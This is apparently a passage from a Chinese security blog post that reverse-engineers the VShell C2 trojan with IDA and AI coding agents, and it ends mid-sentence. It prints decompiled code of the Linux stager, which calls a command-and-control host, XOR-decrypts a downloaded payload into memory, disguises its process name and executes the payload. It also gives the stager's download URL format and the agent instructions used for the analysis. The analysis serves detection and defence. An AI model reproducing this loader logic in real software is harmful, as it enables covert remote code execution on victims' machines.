---
title: 用 AI “杀死” 那个 VShell
url: https://mp.weixin.qq.com/s/HeFMM0VfHNJOXWaD0XUUFQ
source: Doonsec's feed
date: 2026-01-09
fetch_date: 2026-01-10T03:28:36.855556
---

# 用 AI “杀死” 那个 VShell

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4LicHRMXdTzDqIdglPsR3oquIQlPIyRBialibLaHBFkwCJmbib1mp79hHPIpAoq6nBPUes9XYITicVNk4vDR9tzGbiag/0?wx_fmt=jpeg)

# 用 AI “杀死” 那个 VShell

银遁安全团队

![]()

在小说阅读器中沉浸阅读

以下文章来源于WgpSec狼组安全团队
，作者Esonhugh

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM6WovqqRssGgBHic4nREouK9AibGMga4Y06ZkLEOGAogDEA/0)

**WgpSec狼组安全团队**
.

WgpSec 狼组安全团队由几位热爱网络安全的年轻人一同组成过去的几年内没来得及让团队发生有效且质的变化这一次，为了我们的slogan：打造信息安全乌托邦。前进！

**点击蓝字**

![](https://mmbiz.qpic.cn/mmbiz_gif/4LicHRMXdTzCN26evrT4RsqTLtXuGbdV9oQBNHYEQk7MPDOkic6ARSZ7bt0ysicTvWBjg4MbSDfb28fn5PaiaqUSng/640?wx_fmt=gif)

**关注我们**

***声明***

本文作者：Esonhugh

本文字数：9370字

阅读时长：15分钟

附件/链接：点击查看原文下载

**本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载**

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，狼组安全团队以及文章作者不为此承担任何责任。

狼组安全团队有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经狼组安全团队允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

.

[![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4LicHRMXdTzAJOBqtShvMBtBXnAYfHAuziaELxUkYo5Ta1ro6AohToV1RDuFmiaib25w2GypianXgcfVmGR4uSFAdHw/640?wx_fmt=jpeg)](https://mp.weixin.qq.com/s?__biz=MzIyMjkzMzY4Ng==&mid=2247503851&idx=2&sn=8c8c8a70ec6a67177bcd17e612c19330&scene=21#wechat_redirect)

> ❝
>
> 最近闲来无事，想到既然有 Codex 和 Github Copilot Pro 就拿来尝试做一些力所能及的逆向工作。第一个目标便是国人最爱的“开源” C2 —— VShell。

### From Trojan to Trojan

作为一个破解版遍地的地方，你可以很轻易地获取到对应的软件本体。VShell 本身被加入了混淆，相对于服务器本体而言，生成的木马本体更为简单，于是拖进 IDA，启动 IDA-PRO-MCP。

> ❝
>
> 本篇以 ws 协议 linux amd64 木马为例子进行解释。

#### Stager 一阶段木马

通常来说 VShell 木马上线方式为一个快速上线的代码，在监听器创建的时候会生成一个诸如
/slt /swt /slw /sww 的 HTTP 端点，可以让黑客使用 certutil 和 curl 下载脚本后执行木马上线。

其中二次上线的 url 形如 http://host:port/?h=hostname&p=80&t=ws&a=l64&stage=true 的下载 stage 的 url 这些参数均可以修改 均可以正常下载。

上线的木马为第一阶段木马，作为第一阶段的木马，他非常简单，其实就是一个 dropper 下载正式木马后进行内存加载。

对 Linux 来说 它是这样的。

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
/* args define */

  if ( !access("/tmp/log_de.log", 0) ) # check /tmp/log_de.log exists
    exit(0);

```

初始化 获取 /tmp/log\_de.log 文件是否存在，**如果文件存在**：`access` 返回 0 -> 条件为真 -> 执行 `exit(0)` -> **程序直接结束**。

```
  *(_QWORD *)&addr.sa_family = 405798914;
  *(_QWORD *)&addr.sa_data[6] = 0;
  hostbyname = gethostbyname("xxx.xxx.xxx.xxx");
if ( hostbyname )
    v4 = **(_DWORD **)hostbyname->h_addr_list;
else
    v4 = inet_addr("xxx.xxx.xxx.xxx");
  *(_DWORD *)&addr.sa_data[2] = v4;
  fd = socket(2, 1, 0);
  fd_1 = fd;
if ( fd >= 0 )
  {
    optval = 10;
    setsockopt(fd, 6, 7, &optval, 4u);
    while ( connect(fd_1, &addr, 0x10u) == -1 )
      sleep(0xAu);
      // 保持链接 直到连上为止
    v7 = (unsigned __int16)__ROR2__(*(_WORD *)addr.sa_data, 8);
    sprintf(
      s,
      "GET /?a=%s&h=%s&t=%s&p=%d HTTP/1.1\r\n"
      "Host: %s:%d\r\n"
      "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0\r\n"
      "\r\n",
      "l64", // 客户端类型
      "xxx.xxx.xxx.xxx", // host
      "ws_", // 协议
      v7,
      "xxx.xxx.xxx.xxx", // host
      (unsigned __int16)v7);
    send(fd_1, s, 0x400u, 0);
    s_1 = s;
    for ( i = 256; i; --i )
    {
      *(_DWORD *)s_1 = 0;
      s_1 += 4;
    }
    for ( j = 0; ; j += v11 )
    {
      v11 = recv(fd_1, buf, 1u, 0);
      if ( v11 <= 0 )
        break;
      v12 = buf[0] == 10;
      buf[j] = buf[0];
      if ( v12 && buf[j - 1] == 13 && buf[j - 2] == 10 && buf[j - 3] == 13 )
        break;
    }
```

初始化代码 通过 socket tcp 直接发起 http 指定格式报文，然后循环获取对应的字符

```
GET /?a={l64}&h={host}&t={ws_}&p={port} HTTP/1.1\r\n
Host: {host}:{port}\r\n
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0\r\n
\r\n
```

然后程序就创建内存文件接受服务器传输的数据 并且逐字符解密 xor 0x99 解密

> ❝
>
> syscall 319 即为 memfd\_create syscall

```
    fd_2 = syscall(319, "a", 1);
    if ( fd_2 >= 0 )
    {
      while ( 1 )
      {
        n = recv(fd_1, buf_1, 0x1000u, 0);
        if ( n <= 0 )
          break;
        buf_2 = buf_1;
        do
          *buf_2++ ^= 0x99u; # 解密 shellcode
        while ( (int)((_DWORD)buf_2 - (unsigned int)buf_1) < n );
        write(fd_2, buf_1, n);
      }
      n1024 = 1024;
      buf_3 = buf_1;
      while ( n1024 )
      {
        *buf_3++ = 0;
        --n1024;
      }
```

设置环境变量 伪装内存 process name 为 `[kworker/0:2]` 并且使用 fexecve 执行文件

```
      close(fd_1);
      realpath(*argv, resolved);
      setenv("CWD", resolved, 1);
      argva[0] = "[kworker/0:2]";
      argva[1] = 0;
      fexecve(fd_2, argva, _bss_start);
      close(fd_1);
    }
  }
  return 0;
}
```

#### Staged 主要木马

通过在 gdb 中对 fexecve 下端点，我们可以轻易地在 /proc/{pid}/fd/4 ==> "a" 中得到执行前的 elf 文件。

通过对该 elf 文件进行分析，我们可以看到该文件本质是一个完全上线的 VShell 二阶段木马，也是最主要的核心客户端。

根据基本的信息查看，文件存在一些很强的 go 特征，包括 `.go.buildinfo``.gosymtab``.gopclntab`。那就废话不多说，直接拖进 IDA 9.2 打开 MCP，codex 启动！

基础的 Agents.md 如下

```
# Decompiler Agents

Your task is to create a complete and comprehensive reverse engineering analysis. Reference GOALS.md to understand the project goals and ensure the analysis serves our purposes.

Use the following systematic methodology:

1. **Decompilation Analysis**
   - Thoroughly inspect the decompiler output
   - Add detailed comments documenting your findings
   - Focus on understanding the actual functionality and purpose of each component (do not rely on old, incorrect comments)

2. **Improve Readability in the Database**
   - Rename variables to sensible, descriptive names
   - Correct variable and argument types where necessary (especially pointers and array types)
   - Update function names to be descriptive of their actual purpose

3. **Deep Dive When Needed**
   - If more details are necessary, examine the disassembly and add comments with findings
   - Document any low-level behaviors that aren't clear from the decompilation alone
   - Use sub-agents to perform detailed analysis

4. **Important Constraints**
   - NEVER convert number bases yourself - use the int_convert MCP tool if needed
   - Use MCP tools to retrieve information as necessary
   - Derive all conclusions from actual analysis, not assumptions

5. **Documentation**
   - Produce comprehensive REVERSE/*.md files with your findings
   - Document the steps taken and methodology used
   - When asked by the user, ensure accuracy over previous analysis file
   - Organize findings in a way that serves the project goals outlined in GOALS.md
   - All document should be Chinese simplified.
   -  ensure all documentation is clear, comprehensive, and accessible for future reference.

6. **Scripting**
   - [IMPORTANT] Don't writing any scripts with terminal commands. like `python << PYEOF` or `echo "script content" > script.py`, directly add a tempwork.py file and use uv to run it or terminal will be broken.
   - write scripts and save them directly as files in scripts/ directory.
   - run or play any python scripts with UV, like `uv run scripts/decrypt.py`.
   - Ensure scripts are well-documented and maintainable.
   - DON'T USE/REFERENCE OTHER scripts when u analyze with IDA. They could be wrong or outdated.

7. **Golang Reversing** [IMPORTANT]
   - [IMPORTANT] Golang will pack a lot of methods into a single file. Make sure to break them down logically. Golang will contain function that are not used.
   - [IMPORTANT] You need to identify the entrypoints and the main flow of the program first, then follow the calls from there.
   - [IMPORTANT] Strings for Golang are stored in a special way, they store like a pointer to the data and the length. So be careful when you see strings in Golang, they might not be what they seem.
```

GOALS.md

```
## Goals

1. completely understand the functionality and purpose of the target software.
  > This should be FUNCTIONALITY.md
2. completely document everything about its traffic patterns, protocols, and data structures.
  > This should be TRAFFIC.md
3. completely document the internal workings of the software, including algorithms, data flows, and architecture.
  > This should be ARCHITECTURE.md
4. produce a decryption python script to decode its traffic for further analysis and detection or defense purposes.
  > This should be decrypt.py
5. if it has embed configuration data, extract a...